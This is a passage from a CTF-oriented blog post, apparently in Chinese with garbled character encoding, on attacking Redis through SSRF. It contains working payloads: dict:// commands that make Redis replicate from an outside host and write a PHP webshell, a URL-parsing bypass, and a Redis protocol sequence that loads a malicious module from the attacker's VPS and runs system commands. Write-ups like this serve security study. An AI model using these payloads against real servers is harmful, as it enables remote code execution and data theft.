<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dict:&#x2F;&#x2F;0:6379&#x2F;slaveof:192.168.2.112:6301</span><br><span class="line">dict:&#x2F;&#x2F;0:6379&#x2F;config:set:dir:&#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">dict:&#x2F;&#x2F;0:6379&#x2F;config:set:dbfilename:shell.php</span><br><span class="line">dict:&#x2F;&#x2F;0:6379&#x2F;save</span><br><span class="line">dict:&#x2F;&#x2F;0:6379&#x2F;slaveof:no:one</span><br></pre></td></tr></table></figure>

<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20210218202617565.png" alt="image-20210218202617565"></p>
<p>è¦åŠ è½½<code>.so</code>æ¶æ„æ–‡ä»¶çš„è¯ï¼Œåƒä¸Šé¢é‚£æ ·å¯åŠ¨ä¸ª python çš„ redis è¢«åŠ¨è¿æ¥æœåŠ¡å³å¯</p>
<h4 id="dictåè®®å…¶ä»–éƒ¨åˆ†"><a href="#dictåè®®å…¶ä»–éƒ¨åˆ†" class="headerlink" title="dictåè®®å…¶ä»–éƒ¨åˆ†"></a>dictåè®®å…¶ä»–éƒ¨åˆ†</h4><p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20210219213118916.png" alt="image-20210219213118916"></p>
<p>è¿™é‡Œæ‘˜æŠ„éƒç¦»æ­Œå¸ˆå‚…åšå®¢ï¼Œdict åè®®å¹¶ä¸èƒ½åƒä¸Šé¢ gopher åè®®é‚£æ ·æ¥çŒœæµ‹å¼±å£ä»¤</p>
<h2 id="åœ¨CTFä¸­çš„åˆ©ç”¨"><a href="#åœ¨CTFä¸­çš„åˆ©ç”¨" class="headerlink" title="åœ¨CTFä¸­çš„åˆ©ç”¨"></a>åœ¨CTFä¸­çš„åˆ©ç”¨</h2><h3 id="gactf2020-ssrfme"><a href="#gactf2020-ssrfme" class="headerlink" title="gactf2020 ssrfme"></a>gactf2020 ssrfme</h3><p>å› ä¸ºæ²¡æœ‰ç¯å¢ƒå¤ç°ï¼Œå¯ä»¥å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://my.oschina.net/u/4593189/blog/4646830">https://my.oschina.net/u/4593189/blog/4646830</a></p>
<h3 id="ç½‘é¼æ¯-ç„æ­¦-SSRFMe"><a href="#ç½‘é¼æ¯-ç„æ­¦-SSRFMe" class="headerlink" title="ç½‘é¼æ¯ ç„æ­¦ - SSRFMe"></a>ç½‘é¼æ¯ ç„æ­¦ - SSRFMe</h3><p>åœ¨buuå¹³å°å¯ä»¥å¤ç°</p>
<p>ç¬¬ä¸€æ­¥åˆ©ç”¨ curl å’Œ parse_url ç»•è¿‡çš„å°trick</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;http:&#x2F;&#x2F;www.baidu@0.0.0.0&#x2F;hint.php</span><br></pre></td></tr></table></figure>

<p>ç„¶åå¾—åˆ°æç¤ºï¼šredispass is rootï¼Œå¯å¾—çŸ¥ redis çš„å¼±å£ä»¤æ˜¯rootï¼Œç„¶åç”¨ä¸Šé¢çš„ gopher åè®®ä¸»ä»å¤åˆ¶å»æ‰“ï¼Œåœ¨è‡ªå·±çš„vpsä¸Šå¯åŠ¨è¢«åŠ¨é“¾æ¥</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">*2</span><br><span class="line">$4</span><br><span class="line">AUTH</span><br><span class="line">$4</span><br><span class="line">root</span><br><span class="line">*3</span><br><span class="line">$7</span><br><span class="line">SLAVEOF</span><br><span class="line">$2 &#x2F;&#x2F;vpsipé•¿åº¦</span><br><span class="line">ip &#x2F;&#x2F;vpsipåœ°å€</span><br><span class="line">$5</span><br><span class="line">21000</span><br><span class="line">*4</span><br><span class="line">$6</span><br><span class="line">CONFIG</span><br><span class="line">$3</span><br><span class="line">SET</span><br><span class="line">$3</span><br><span class="line">dir</span><br><span class="line">$5</span><br><span class="line">&#x2F;tmp&#x2F;</span><br><span class="line">*4</span><br><span class="line">$6</span><br><span class="line">config</span><br><span class="line">$3</span><br><span class="line">set</span><br><span class="line">$10</span><br><span class="line">dbfilename</span><br><span class="line">$6</span><br><span class="line">exp.so</span><br><span class="line">*3</span><br><span class="line">$6</span><br><span class="line">MODULE</span><br><span class="line">$4</span><br><span class="line">LOAD</span><br><span class="line">$11</span><br><span class="line">&#x2F;tmp&#x2F;exp.so</span><br><span class="line">*2</span><br><span class="line">$11</span><br><span class="line">system.exec</span><br><span class="line">$13</span><br><span class="line">cat$&#123;IFS&#125;&#x2F;fl*</span><br><span class="line">*1</span><br><span class="line">$4</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>

<p>ç”¨ä¸Šé¢çš„è„šæœ¬ç¼–ç ä¹‹åå†æ‰‹åŠ¨ url ç¼–ç ä¸€æ¬¡ï¼Œç”¨ gopher åè®®å‘è¿‡å»å³å¯</p>
<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20210221162944340.png" alt="image-20210221162944340"></p>
<h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a target="_blank" rel="noopener" href="https://www.redmango.top/article/51">https://www.redmango.top/article/51</a></p>
<p><a target="_blank" rel="noopener" href="http://yulige.top/?p=775">http://yulige.top/?p=775</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7974">https://xz.aliyun.com/t/7974</a></p>

    </div>

    
    
    

      <footer class="post-footer">

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2021/02/05/bypass%20disable_function/" rel="prev" title="bypass open_basedir and disable_function">
      <i class="fa fa-chevron-left"></i> bypass open_basedir and disable_function
    </a></div>
      <div class="post-nav-item"></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          æ–‡ç« ç›®å½•
        </li>
        <li class="sidebar-nav-overview">
          ç«™ç‚¹æ¦‚è§ˆ
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#redis%E5%9F%BA%E7%A1%80"><span class="nav-number">1.</span> <span class="nav-text">redisåŸºç¡€</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E4%BA%9B%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C"><span class="nav-number">1.1.</span> <span class="nav-text">ä¸€äº›åŸºç¡€æ“ä½œ</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B"><span class="nav-number">1.2.</span> <span class="nav-text">æ•°æ®ç±»å‹</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#redis%E5%8D%8F%E8%AE%AE"><span class="nav-number">1.3.</span> <span class="nav-text">redisåè®®</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%A4%E7%A7%8D%E6%8C%81%E4%B9%85%E5%8C%96%E8%BF%90%E4%BD%9C%E6%96%B9%E6%A1%88"><span class="nav-number">1.4.</span> <span class="nav-text">ä¸¤ç§æŒä¹…åŒ–è¿ä½œæ–¹æ¡ˆ</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E7%9A%84%E5%88%A9%E7%94%A8"><span class="nav-number">2.</span> <span class="nav-text">æœªæˆæƒè®¿é—®çš„åˆ©ç”¨</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%99webshell"><span class="nav-number">2.1.</span> <span class="nav-text">å†™webshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#crontab%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">2.2.</span> <span class="nav-text">crontabåå¼¹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%99ssh-key"><span class="nav-number">2.3.</span> <span class="nav-text">å†™ssh-key</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6RCE"><span class="nav-number">2.4.</span> <span class="nav-text">ä¸»ä»å¤åˆ¶RCE</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E5%9F%BA%E7%A1%80"><span class="nav-number">2.4.1.</span> <span class="nav-text">ä¸»ä»å¤åˆ¶åŸºç¡€</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%B8%80%E9%94%AERCE"><span class="nav-number">2.4.2.</span> <span class="nav-text">ä¸»ä»å¤åˆ¶ä¸€é”®RCE</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF%E4%B8%8Eredis"><span class="nav-number">3.</span> <span class="nav-text">SSRFä¸redis</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#gopher%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8"><span class="nav-number">3.1.</span> <span class="nav-text">gopheråè®®çš„åˆ©ç”¨</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#gopher%E5%8D%8F%E8%AE%AE%E7%8C%9C%E6%B5%8B%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="nav-number">3.1.1.</span> <span class="nav-text">gopheråè®®çŒœæµ‹å¼±å£ä»¤</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#gopher%E5%8D%8F%E8%AE%AE%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6"><span class="nav-number">3.1.2.</span> <span class="nav-text">gopheråè®®ä¸»ä»å¤åˆ¶</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#gopher%E5%8D%8F%E8%AE%AE%E5%85%B6%E4%BB%96%E9%83%A8%E5%88%86"><span class="nav-number">3.1.3.</span> <span class="nav-text">gopheråè®®å…¶ä»–éƒ¨åˆ†</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dict%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8"><span class="nav-number">3.2.</span> <span class="nav-text">dictåè®®çš„åˆ©ç”¨</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#dict%E5%8D%8F%E8%AE%AE%E5%86%99shell"><span class="nav-number">3.2.1.</span> <span class="nav-text">dictåè®®å†™shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#dict%E5%8D%8F%E8%AE%AE%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6"><span class="nav-number">3.2.2.</span> <span class="nav-text">dictåè®®ä¸»ä»å¤åˆ¶</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#dict%E5%8D%8F%E8%AE%AE%E5%85%B6%E4%BB%96%E9%83%A8%E5%88%86"><span class="nav-number">3.2.3.</span> <span class="nav-text">dictåè®®å…¶ä»–éƒ¨åˆ†</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9C%A8CTF%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8"><span class="nav-number">4.</span> <span class="nav-text">åœ¨CTFä¸­çš„åˆ©ç”¨</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#gactf2020-ssrfme"><span class="nav-number">4.1.</span> <span class="nav-text">gactf2020 ssrfme</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-%E7%8E%84%E6%AD%A6-SSRFMe"><span class="nav-number">4.2.</span> <span class="nav-text">ç½‘é¼æ¯ ç„æ­¦ - SSRFMe</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">5.</span> <span class="nav-text">å‚è€ƒé“¾æ¥</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="kawhi"
      src="http://yuhaojiang.gitee.io/picture/Blogå¤´åƒ.jpg">
  <p class="site-author-name" itemprop="name">kawhi</p>
  <div class="site-description" itemprop="description">éšç¬”ã€åˆ†äº«ã€è®°å½•ç”Ÿæ´»</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">34</span>
          <span class="site-state-item-name">æ—¥å¿—</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">7</span>
        <span class="site-state-item-name">åˆ†ç±»</span></a>
      </div>
  </nav>
</div>


  <div class="links-of-blogroll motion-element">
    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
      links
    </div>
    <ul class="links-of-blogroll-list">
        <li class="links-of-blogroll-item">
          <a href="http://47.98.234.232:8000/" title="http:&#x2F;&#x2F;47.98.234.232:8000&#x2F;" rel="noopener" target="_blank">G2mtuå¤‡ç”¨é¶åœº</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="http://kawhi.gearhostpreview.com/" title="http:&#x2F;&#x2F;kawhi.gearhostpreview.com&#x2F;" rel="noopener" target="_blank">OneDriveç½‘ç›˜</a>
        </li>
    </ul>
  </div>

      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">kawhi</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="ç«™ç‚¹æ€»å­—æ•°">350k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="ç«™ç‚¹é˜…è¯»æ—¶é•¿">5:19</span>
</div>
  <div class="powered-by">ç”± <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> å¼ºåŠ›é©±åŠ¨
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

</body>
</html>
